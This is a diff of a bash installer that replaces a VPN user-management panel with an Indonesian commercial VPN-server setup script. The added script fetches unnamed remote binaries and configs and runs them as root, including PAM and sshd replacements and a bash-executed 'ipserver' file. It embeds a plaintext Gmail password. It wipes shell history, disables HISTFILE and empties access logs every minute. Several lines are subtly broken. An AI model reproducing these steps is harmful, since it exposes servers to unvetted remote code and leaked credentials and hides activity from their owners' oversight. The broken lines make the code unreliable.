-  jq --argjson c "$CLIENT" '.inbounds |= map(if .protocol=="vmess" then .settings.clients += [$c] else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-  info "VMESS user $USER ($ID) added."
-  DB=$(read_db)
-  NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg id "$ID" --arg e "$EXPIRE" '.vmess += [{"user":$u,"id":$id,"expire":$e}]')
-  save_db "$NEWDB"
-  systemctl restart xray || warn "xray restart may have failed"
-  # create vmess link (basic)
-  VMESS_JSON=$(jq -n --arg v "2" --arg id "$ID" --arg host "$DOMAIN" '{v:$v,ps:env.USER,add:$host,port:"80",id:$id,aid:"0",net:"ws",type:"none",host:$host,path:"/vmess-ws",tls:""}')
-  VMESS_B64=$(echo -n "$VMESS_JSON" | base64 -w0)
-  echo "vmess://$VMESS_B64"
-}
-
-add_trojan() {
-  read -rp "Account name: " USER
-  PASS=$(openssl rand -hex 12)
-  read -rp "Days active: " DAYS
-  EXPIRE=$(date -d "+$DAYS days" +%Y-%m-%d)
-  CLIENT=$(jq -n --arg pass "$PASS" --arg email "$USER" '{password:$pass, email:$email}')
-  tmp=$(mktemp)
-  jq --argjson c "$CLIENT" '.inbounds |= map(if .protocol=="trojan" then .settings.clients += [$c] else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-  info "Trojan account $USER with pass $PASS added."
-  DB=$(read_db)
-  NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg p "$PASS" --arg e "$EXPIRE" '.trojan += [{"user":$u,"pass":$p,"expire":$e}]')
-  save_db "$NEWDB"
-  systemctl restart xray || warn "xray restart may have failed"
-  TROJAN_LINK="trojan://${PASS}@${DOMAIN}:8443?path=/trojan-ws&security=tls&type=ws#${USER}"
-  echo "Trojan link: $TROJAN_LINK"
-}
-
-add_ss2022() {
-  read -rp "Account name: " USER
-  PASS=$(openssl rand -base64 12)
-  read -rp "Days active: " DAYS
-  EXPIRE=$(date -d "+$DAYS days" +%Y-%m-%d)
-  CLIENT=$(jq -n --arg method "2022-blake3-aes-128-gcm" --arg password "$PASS" --arg email "$USER" '{method:$method, password:$password, email:$email}')
-  tmp=$(mktemp)
-  jq --argjson c "$CLIENT" '.inbounds |= map(if .protocol=="shadowsocks" then .settings.clients += [$c] else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-  info "Shadowsocks2022 user $USER added."
-  DB=$(read_db)
-  NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg p "$PASS" --arg e "$EXPIRE" '.ss2022 += [{"user":$u,"pass":$p,"expire":$e}]')
-  save_db "$NEWDB"
-  systemctl restart xray || warn "xray restart may have failed"
-  echo "SS2022 user:$USER password:$PASS"
-}
-
-# -----------------------------
-# Delete generic xray user by type
-# -----------------------------
-del_xray_user() {
-  read -rp "Type (vless/vmess/trojan/ss2022): " TYPE
-  read -rp "Identifier (username): " USER
-  case "$TYPE" in
-    vless)
-      # remove from DB
-      DB=$(read_db)
-      NEWDB=$(echo "$DB" | jq --arg u "$USER" '.vless |= map(select(.user != $u))')
-      save_db "$NEWDB"
-      # remove from config by matching email field
-      tmp=$(mktemp)
-      jq --arg u "$USER" '.inbounds |= map(if .settings and .settings.clients then (.settings.clients |= map(select(.email != $u))) else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-      ;;
-    vmess)
-      DB=$(read_db)
-      NEWDB=$(echo "$DB" | jq --arg u "$USER" '.vmess |= map(select(.user != $u))')
-      save_db "$NEWDB"
-      tmp=$(mktemp)
-      jq --arg u "$USER" '.inbounds |= map(if .settings and .settings.clients then (.settings.clients |= map(select(.email != $u))) else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-      ;;
-    trojan)
-      DB=$(read_db)
-      NEWDB=$(echo "$DB" | jq --arg u "$USER" '.trojan |= map(select(.user != $u))')
-      save_db "$NEWDB"
-      tmp=$(mktemp)
-      jq --arg u "$USER" '.inbounds |= map(if .settings and .settings.clients then (.settings.clients |= map(select(.email != $u))) else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-      ;;
-    ss2022)
-      DB=$(read_db)
-      NEWDB=$(echo "$DB" | jq --arg u "$USER" '.ss2022 |= map(select(.user != $u))')
-      save_db "$NEWDB"
-      tmp=$(mktemp)
-      jq --arg u "$USER" '.inbounds |= map(if .settings and .settings.clients then (.settings.clients |= map(select(.email != $u))) else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-      ;;
-    *)
-      warn "Unknown type"
-      return 1
-      ;;
-  esac
-  systemctl restart xray || warn "xray restart may have failed"
-  info "Deleted $TYPE user $USER"
-}
-
-# -----------------------------
-# Show all users
-# -----------------------------
-show_all_users() {
-  echo "==== Users DB ===="
-  jq -r '. | to_entries[] | "\(.key): \(.value | length) entries"' "$USERS_DB"
-  echo ""
-  jq -r '. | to_entries[] | "\(.key):\n"+(.value|map("  \(.user) | expire:\(.expire // \"-\")")|join("\n"))' "$USERS_DB"
-}
-
-# -----------------------------
-# Check online users (based on access log)
-# -----------------------------
-check_online() {
-  LOG="/var/log/xray/access.log"
-  if [ ! -f "$LOG" ]; then
-    warn "Log file $LOG not found."
-    return 1
-  fi
-  echo "=== Active connections (last 200 lines) ==="
-  tail -n 200 "$LOG" | awk '{print $1, $3, $7}' | sort | uniq -c | sort -nr | head -n 50
-}
-
-# -----------------------------
-# Backup & Restore
-# -----------------------------
-backup_all() {
-  TIMESTAMP=$(date +"%Y%m%d-%H%M")
-  TAR="/root/konoha-backup-$TIMESTAMP.tar.gz"
-  tar czf "$TAR" /usr/local/etc/xray /etc/konoha /etc/domain /etc/letsencrypt 2>/dev/null || true
-  info "Backup created: $TAR"
-}
-
-restore_from() {
-  read -rp "Path to backup tar.gz: " TARPATH
-  if [ ! -f "$TARPATH" ]; then
-    err "Backup not found."
-    return 1
-  fi
-  tar xzf "$TARPATH" -C / 2>/dev/null || true
-  info "Restore complete. Please verify configs and restart services."
-}
-
-# -----------------------------
-# Panel script (final menu)
-# -----------------------------
-PANEL_DIR="/usr/local/konoha-panel"
-mkdir -p "$PANEL_DIR"
-cat > "$PANEL_DIR/menu.sh" <<'EOF'
-#!/bin/bash
-# KONOHA PANEL FRONTEND
-RED='\e[1;31m'; GREEN='\e[0;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
-DOMAIN="$(cat /etc/konoha_domain 2>/dev/null || echo 'unknown')"
-
-while true; do
-  clear
-  # Logo
-  cat <<'KLOGO'
-           .::::::::::::.
-        .:::'.:::::::.`:::.
-      .:::'  ':::::::'  `:::.
-     :::''   .::::::::.   '':::
-    :::     :::::::::::::     :::
-    :::    :::::::::::::::    :::
-    :::    :::::::::::::::    :::
-     :::.   '::::::::::::'   .:::
-      `:::..  `':::::::'`  ..:::'
-        `:::::..      ..:::::'
-           `'::::::::::::'`
-                `'::::'`
-KLOGO
-
-  # bandwidth
-  IFACE=$(ip route get 1.1.1.1 2>/dev/null | awk '/dev/ {print $5; exit}')
-  IFACE=${IFACE:-eth0}
-  rx1=$(cat /sys/class/net/$IFACE/statistics/rx_bytes 2>/dev/null || echo 0)
-  tx1=$(cat /sys/class/net/$IFACE/statistics/tx_bytes 2>/dev/null || echo 0)
-  sleep 1
-  rx2=$(cat /sys/class/net/$IFACE/statistics/rx_bytes 2>/dev/null || echo 0)
-  tx2=$(cat /sys/class/net/$IFACE/statistics/tx_bytes 2>/dev/null || echo 0)
-  rx=$(( (rx2 - rx1) / 1024 ))
-  tx=$(( (tx2 - tx1) / 1024 ))
-
-  echo -e "${YELLOW}Domain:${GREEN} $DOMAIN ${NC}    ${YELLOW}BW:${GREEN} ↓${rx}KB/s ↑${tx}KB/s${NC}"
-  echo "======================================================="
-  echo -e "${BLUE} 1${NC}. SSH Management"
-  echo -e "${BLUE} 2${NC}. XRAY Management"
-  echo -e "${BLUE} 3${NC}. Add TROJAN / SS"
-  echo -e "${BLUE} 4${NC}. Backup / Restore"
-  echo -e "${BLUE} 5${NC}. Show All Users"
-  echo -e "${BLUE} 6${NC}. Check Online"
-  echo -e "${BLUE} 7${NC}. Restart Services"
-  echo -e "${BLUE} 0${NC}. Exit"
-  echo -n "Select: "
-  read opt
-  case $opt in
-    1)
-      /usr/local/konoha-panel/ssh_menu.sh
-      ;;
-    2)
-      /usr/local/konoha-panel/xray_menu.sh
-      ;;
-    3)
-      /usr/local/konoha-panel/add_trojan_ss.sh
-      ;;
-    4)
-      /usr/local/konoha-panel/backup_menu.sh
-      ;;
-    5)
-      jq -r '. | to_entries[] | "\(.key):\n"+(.value|map("  \(.user) | expire:\(.expire // \"-\")")|join("\n"))' /etc/konoha/users.json
-      read -p "Press enter..."
-      ;;
-    6)
-      tail -n 200 /var/log/xray/access.log 2>/dev/null | awk '{print $1,$3,$7}' | sort | uniq -c | sort -nr | head -n 40
-      read -p "Press enter..."
-      ;;
-    7)
-      systemctl restart xray dropbear || true
-      echo "Services restarted"
-      sleep 1
-      ;;
-    0) exit 0 ;;
-    *) echo "Invalid"; sleep 1 ;;
-  esac
-done
+function install_xray() {
+clear
+print_install "Core Xray 1.8.1 Latest Version"
+domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
+chown www-data.www-data $domainSock_dir
+latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
+bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
+wget -O /etc/xray/config.json "${REPO}files/config.json" >/dev/null 2>&1
+wget -O /etc/systemd/system/runn.service "${REPO}files/runn.service" >/dev/null 2>&1
+domain=$(cat /etc/xray/domain)
+IPVS=$(cat /etc/xray/ipvps)
+print_success "Core Xray 1.8.1 Latest Version"
+clear
+curl -s ipinfo.io/city >>/etc/xray/city
+curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
+print_install "Memasang Konfigurasi Packet"
+wget -O /etc/haproxy/haproxy.cfg "${REPO}files/haproxy.cfg" >/dev/null 2>&1
+wget -O /etc/nginx/conf.d/xray.conf "${REPO}files/xray.conf" >/dev/null 2>&1
+sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
+sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
+curl ${REPO}files/nginx.conf > /etc/nginx/nginx.conf
+cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
+chmod +x /etc/systemd/system/runn.service
+rm -rf /etc/systemd/system/xray.service.d
+cat >/etc/systemd/system/xray.service <<EOF
+Description=Xray Service
+Documentation=https://github.com
+After=network.target nss-lookup.target
+[Service]
+User=www-data
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
+Restart=on-failure
+RestartPreventExitStatus=23
+filesNPROC=10000
+filesNOFILE=1000000
+[Install]
+WantedBy=multi-user.target
 EOF
-chmod +x "$PANEL_DIR/menu.sh"
-
-# SSH submenu
-cat > "$PANEL_DIR/ssh_menu.sh" <<'EOF'
-#!/bin/bash
-. /usr/local/konoha-panel/env.sh 2>/dev/null || true
-while true; do
-  clear
-  echo "SSH MANAGEMENT"
-  echo "1) Add SSH user"
-  echo "2) Delete SSH user"
-  echo "3) Renew SSH user"
-  echo "4) List SSH users"
-  echo "0) Back"
-  read -rp "Choice: " c
-  case $c in
-    1) /usr/local/konoha-panel/handlers.sh add_ssh ;;
-    2) /usr/local/konoha-panel/handlers.sh del_ssh ;;
-    3) /usr/local/konoha-panel/handlers.sh renew_ssh ;;
-    4) /usr/local/konoha-panel/handlers.sh list_ssh ;;
-    0) break ;;
-    *) echo "Invalid"; sleep 1;;
-  esac
-done
+print_success "Konfigurasi Packet"
+}
+function ssh(){
+clear
+print_install "Memasang Password SSH"
+wget -O /etc/pam.d/common-password "${REPO}files/password"
+chmod +x /etc/pam.d/common-password
+DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
+debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
+cd
+cat > /etc/systemd/system/rc-local.service <<-END
+[Unit]
+Description=/etc/rc.local
+ConditionPathExists=/etc/rc.local
+[Service]
+Type=forking
+ExecStart=/etc/rc.local start
+TimeoutSec=0
+StandardOutput=tty
+RemainAfterExit=yes
+SysVStartPriority=99
+[Install]
+WantedBy=multi-user.target
+END
+cat > /etc/rc.local <<-END
+exit 0
+END
+chmod +x /etc/rc.local
+systemctl enable rc-local
+systemctl start rc-local.service
+echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
+sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
+ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+print_success "Password SSH"
+}
+function udp_mini(){
+clear
+print_install "Memasang Service limit Quota"
+wget "${REPO}/files/limit.sh && chmod +x limit.sh && ./limit.sh"
+cd
+wget -q -O /usr/bin/limit-ip "${REPO}files/limit-ip"
+chmod +x /usr/bin/*
+cd /usr/bin
+sed -i 's/\r//' limit-ip
+cd
+clear
+cat >/etc/systemd/system/vmip.service << EOF
+[Unit]
+Description=My
+ProjectAfter=network.target
+[Service]
+WorkingDirectory=/root
+ExecStart=/usr/bin/files-ip vmip
+Restart=always
+[Install]
+WantedBy=multi-user.target
 EOF
-chmod +x "$PANEL_DIR/ssh_menu.sh"
+systemctl daemon-reload
+systemctl restart vmip
+systemctl enable vmip
+cat >/etc/systemd/system/vlip.service << EOF
+[Unit]
+Description=My
+ProjectAfter=network.target
+[Service]
+WorkingDirectory=/root
+ExecStart=/usr/bin/files-ip vlip
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl daemon-reload
+systemctl restart vlip
+systemctl enable vlip
+cat >/etc/systemd/system/trip.service << EOF
+[Unit]
+Description=My
+ProjectAfter=network.target
+[Service]
+WorkingDirectory=/root
+ExecStart=/usr/bin/files-ip trip
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl daemon-reload
+systemctl restart trip
+systemctl enable trip
+mkdir -p /usr/local/kyt/
+wget -q -O /usr/local/kyt/udp-mini "${REPO}files/udp-mini"
+chmod +x /usr/local/kyt/udp-mini
+wget -q -O /etc/systemd/system/udp-mini-1.service "${REPO}files/udp-mini-1.service"
+wget -q -O /etc/systemd/system/udp-mini-2.service "${REPO}files/udp-mini-2.service"
+wget -q -O /etc/systemd/system/udp-mini-3.service "${REPO}files/udp-mini-3.service"
+systemctl disable udp-mini-1
+systemctl stop udp-mini-1
+systemctl enable udp-mini-1
+systemctl start udp-mini-1
+systemctl disable udp-mini-2
+systemctl stop udp-mini-2
+systemctl enable udp-mini-2
+systemctl start udp-mini-2
+systemctl disable udp-mini-3
+systemctl stop udp-mini-3
+systemctl enable udp-mini-3
+systemctl start udp-mini-3
+print_success "files Quota Service"
+}
+clear
+function ins_SSHD(){
+clear
+print_install "Memasang SSHD"
+wget -q -O /etc/ssh/sshd_config "${REPO}files/sshd" >/dev/null 2>&1
+chmod 700 /etc/ssh/sshd_config
+/etc/init.d/ssh restart
+systemctl restart ssh
+/etc/init.d/ssh status
+print_success "SSHD"
+}
+clear
+function ins_dropbear(){
+clear
+print_install "Menginstall Dropbear"
+apt-get install dropbear -y > /dev/null 2>&1
+wget -q -O /etc/default/dropbear "${REPO}files/dropbear.conf"
+chmod +x /etc/default/dropbear
+/etc/init.d/dropbear restart
+/etc/init.d/dropbear status
+print_success "Dropbear"
+}
+clear
+function ins_vnstat(){
+clear
+print_install "Menginstall Vnstat"
+apt -y install vnstat > /dev/null 2>&1
+/etc/init.d/vnstat restart
+apt -y install libsqlite3-dev > /dev/null 2>&1
+wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
+tar zxvf vnstat-2.6.tar.gz
+cd vnstat-2.6
+./configure --prefix=/usr --sysconfdir=/etc && make && make install
+cd
+vnstat -u -i $NET
+sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
+chown vnstat:vnstat /var/lib/vnstat -R
+systemctl enable vnstat
+/etc/init.d/vnstat restart
+/etc/init.d/vnstat status
+rm -f /root/vnstat-2.6.tar.gz
+rm -rf /root/vnstat-2.6
+print_success "Vnstat"
+}
+function ins_openvpn(){
+clear
+print_install "Menginstall OpenVPN"
+wget ${REPO}files/openvpn &&  chmod +x openvpn && ./openvpn
+/etc/init.d/openvpn restart
+print_success "OpenVPN"
+}
+function ins_backup(){
+clear
+print_install "Memasang Backup Server"
+apt install rclone -y
+printf "q\n" | rclone config
+wget -O /root/.config/rclone/rclone.conf "${REPO}files/rclone.conf"
+cd /bin
+git clone  https://github.com/LunaticBackend/wondershaper.git
+cd wondershaper
+sudo make install
+cd
+rm -rf wondershaper
+echo > /home/files
+apt install msmtp-mta ca-certificates bsd-mailx -y
+cat<<EOF>>/etc/msmtprc
+defaults
+tls on
+tls_starttls on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+account default
+host smtp.gmail.com
+port 587
+auth on
+user oceantestdigital@gmail.com
+from oceantestdigital@gmail.com
+password jokerman77
+logfile ~/.msmtp.log
+EOF
+chown -R www-data:www-data /etc/msmtprc
+wget -q -O /etc/ipserver "${REPO}files/ipserver" && bash /etc/ipserver
+print_success "Backup Server"
+}
+clear
+function ins_swab(){
+clear
+print_install "Memasang Swap 1 G"
+gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
+gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
+curl -sL "$gotop_link" -o /tmp/gotop.deb
+dpkg -i /tmp/gotop.deb >/dev/null 2>&1
+dd if=/dev/zero of=/swapfile bs=1024 count=1048576
+mkswap /swapfile
+chown root:root /swapfile
+chmod 0600 /swapfile >/dev/null 2>&1
+swapon /swapfile >/dev/null 2>&1
+sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
+chronyd -q 'server 0.id.pool.ntp.org iburst'
+chronyc sourcestats -v
+chronyc tracking -v
+wget ${REPO}files/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
+print_success "Swap 1 G"
+}
+function ins_Fail2ban(){
+clear
+print_install "Menginstall Fail2ban"
+if [ -d '/usr/local/ddos' ]; then
+echo; echo; echo "Please un-install the previous version first"
+exit 0
+else
+mkdir /usr/local/ddos
+fi
+clear
+echo "Banner /etc/banner.txt" >>/etc/ssh/sshd_config
+sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner.txt"@g' /etc/default/dropbear
+wget -O /etc/banner.txt "${REPO}files/issue.net"
+print_success "Fail2ban"
+}
+function ins_epro(){
+clear
+print_install "Menginstall ePro WebSocket Proxy"
+wget -O /usr/bin/ws "${REPO}files/ws" >/dev/null 2>&1
+wget -O /usr/bin/tun.conf "${REPO}files/tun.conf" >/dev/null 2>&1
+wget -O /etc/systemd/system/ws.service "${REPO}files/ws.service" >/dev/null 2>&1
+chmod +x /etc/systemd/system/ws.service
+chmod +x /usr/bin/ws
+chmod 644 /usr/bin/tun.conf
+systemctl disable ws
+systemctl stop ws
+systemctl enable ws
+systemctl start ws
+systemctl restart ws
+wget -q -O /usr/local/share/xray/geosite.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geosite.dat" >/dev/null 2>&1
+wget -q -O /usr/local/share/xray/geoip.dat "https://github.com/Loyalsoldier/v2ray-rules-dat/releases/latest/download/geoip.dat" >/dev/null 2>&1
+wget -O /usr/sbin/ftvpn "${REPO}files/ftvpn" >/dev/null 2>&1
+chmod +x /usr/sbin/ftvpn
+iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
+iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
+iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
+iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
+iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
+iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
+iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
+iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
+iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
+iptables-save > /etc/iptables.up.rules
+iptables-restore -t < /etc/iptables.up.rules
+netfilter-persistent save
+netfilter-persistent reload
+cd
+apt autoclean -y >/dev/null 2>&1
+apt autoremove -y >/dev/null 2>&1
+print_success "ePro WebSocket Proxy"
+}
+function ins_restart(){
+clear
+print_install "Restarting  All Packet"
+/etc/init.d/nginx restart
+/etc/init.d/openvpn restart
+/etc/init.d/ssh restart
+/etc/init.d/dropbear restart
+/etc/init.d/fail2ban restart
+/etc/init.d/vnstat restart
+systemctl restart haproxy
+/etc/init.d/cron restart
+systemctl daemon-reload
+systemctl start netfilter-persistent
+systemctl enable --now nginx
+systemctl enable --now xray
+systemctl enable --now rc-local
+systemctl enable --now dropbear
+systemctl enable --now openvpn
+systemctl enable --now cron
+systemctl enable --now haproxy
+systemctl enable --now netfilter-persistent
+systemctl enable --now ws
+systemctl enable --now fail2ban
+history -c
+echo "unset HISTFILE" >> /etc/profile
+cd
+rm -f /root/openvpn
+rm -f /root/key.pem
+rm -f /root/cert.pem
+print_success "All Packet"
+}
+function menu(){
+clear
+print_install "Memasang Menu Packet"
+wget ${REPO}menu.zip
+unzip menu.zip
+chmod +x menu/*
+mv menu/* /usr/local/sbin
+rm -rf menu
+rm -rf menu.zip
+}
 
-# Xray submenu
-cat > "$PANEL_DIR/xray_menu.sh" <<'EOF'
-#!/bin/bash
-while true; do
-  clear
-  echo "XRAY MANAGEMENT"
-  echo "1) Add VLESS"
-  echo "2) Add VMESS"
-  echo "3) Add Trojan"
-  echo "4) Add Shadowsocks2022"
-  echo "5) Delete Xray user"
-  echo "6) List all users (db)"
-  echo "7) Restart Xray"
+function profile(){
+clear
+cat >/root/.profile <<EOF
+if [ "$BASH" ]; then
+if [ -f ~/.bashrc ]; then
+. ~/.bashrc
+fi
+fi
+mesg n || true
+welcome
+EOF
+cat >/etc/cron.d/xp_all <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+2 0 * * * root /usr/local/sbin/xp
+END
+cat >/etc/cron.d/logclean <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*/10 * * * * root /usr/local/sbin/clearlog
+END
+chmod 644 /root/.profile
+cat >/etc/cron.d/daily_reboot <<-END
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+0 5 * * * root /sbin/reboot
+END
+echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
+echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
+service cron restart
+cat >/home/daily_reboot <<-END
+5
+END
+cat >/etc/systemd/system/rc-local.service <<EOF
+[Unit]
+Description=/etc/rc.local
+ConditionPathExists=/etc/rc.local
+[Service]
+Type=forking
+ExecStart=/etc/rc.local start
+TimeoutSec=0
+StandardOutput=tty
+RemainAfterExit=yes
+SysVStartPriority=99
+[Install]
+WantedBy=multi-user.target
+EOF
+echo "/bin/false" >>/etc/shells
+echo "/usr/sbin/nologin" >>/etc/shells
+cat >/etc/rc.local <<EOF
+iptables -I INPUT -p udp --dport 5300 -j ACCEPT
+iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
+systemctl restart netfilter-persistent
+exit 0
+EOF
+chmod +x /etc/rc.local
+AUTOREB=$(cat /home/daily_reboot)
+SETT=11
+if [ $AUTOREB -gt $SETT ]; then
+TIME_DATE="PM"
+else
+TIME_DATE="AM"
+fi
+print_success "Menu Packet"
+}
+function enable_services(){
+clear
+print_install "Enable Service"
+systemctl daemon-reload
+systemctl start netfilter-persistent
+systemctl enable --now rc-local
+systemctl enable --now cron
+systemctl enable --now netfilter-persistent
+systemctl restart nginx
+systemctl restart xray
+systemctl restart cron
+systemctl restart haproxy
+print_success "Enable Service"
+clear
+}
+function instal(){
+clear
+first_setup
+nginx_install
+base_package
+make_folder_xray
+pasang_domain
+password_default
+pasang_ssl
+install_xray
+ssh
+udp_mini
+ins_SSHD
+ins_dropbear
+ins_vnstat
+ins_openvpn
+ins_backup
+ins_swab
+ins_Fail2ban
+ins_epro
+ins_restart
+menu
+profile
+enable_services
+restart_system
+}
+instal
+echo ""
+history -c
+rm -rf /root/menu
+rm -rf /root/*.zip
+rm -rf /root/*.sh
+rm -rf /root/LICENSE
+rm -rf /root/README.md
+rm -rf /root/domain
+secs_to_human "$(($(date +%s) - ${start}))"
+sudo hostnamectl set-hostname $username
+clear
+echo -e ""
+echo -e ""
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
+echo -e "\e[96;1m                 ----[ JP OFFICIAL PROJECT ]----                \e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
+echo ""
+echo -e "\e[95;1m  Telegram : @JPOFFICIALSTORE \e[0m"
+echo ""
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
+echo -e "\e[92;1m                  ----[ INSTALL SUCCES ]----                 \e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
+echo -e ""
+echo -e " \e[93;1m•\e[0m SSH  = UDP / OPENVPN / ENHANCED / MULTI PORT "
+echo -e " \e[93;1m•\e[0m VMESS = MULTIPATCH / MULTIPORT / GRPC / TLS / WS "
+echo -e " \e[93;1m•\e[0m VLESS = MULTIPATCH / MULTIPORT / GRPC / TPS / WS "
+echo -e " \e[93;1m•\e[0m TROJAN = MULTIPATCH / MULTIPORT / GRPC / TLS / WS+SSL "
+echo -e " \e[93;1m•\e[0m SSR = MULTIPATCH / MULTIPORT / GRPC / TLS "
+echo -e ""
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗\e[0m"
+echo -e "\e[92;1m                    ----[ INFO PORT ]----                      \e[0m"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
+echo -e ""
+echo -e " \e[93;1m•\e[0m WEBSOCKET / WS / NTLS   :  80,8880,8080,2082,2095,2082 "
+echo -e " \e[93;1m•\e[0m SSL  / TLS / GRPC /     :  443,8443 "
+echo -e " \e[93;1m•\e[0m UDP CUSTOM              :  1-65535 "
+echo -e ""
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
+echo -e ""
+echo ""
+read -p "[ Enter ]  TO REBOOT"
+reboot
